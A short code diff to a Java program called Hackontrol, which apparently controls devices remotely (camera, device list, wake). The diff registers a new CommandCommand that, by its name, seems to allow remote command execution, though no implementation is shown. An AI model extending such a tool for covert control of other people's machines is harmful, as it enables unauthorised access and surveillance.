@@ -13,6 +13,7 @@ import java.util.prefs.Preferences;
 
 import com.khopan.hackontrol.command.CameraCommand;
 import com.khopan.hackontrol.command.Command;
+import com.khopan.hackontrol.command.CommandCommand;
 import com.khopan.hackontrol.command.DeviceListCommand;
 import com.khopan.hackontrol.command.HelpCommand;
 import com.khopan.hackontrol.command.NicknameCommand;
@@ -60,6 +61,7 @@ public class Hackontrol {
 		this.registerCommand(new CameraCommand());
 		this.registerCommand(new NicknameCommand());
 		this.registerCommand(new WakeCommand());
+		this.registerCommand(new CommandCommand());
 	}
 
 	private void registerCommand(Command command) {
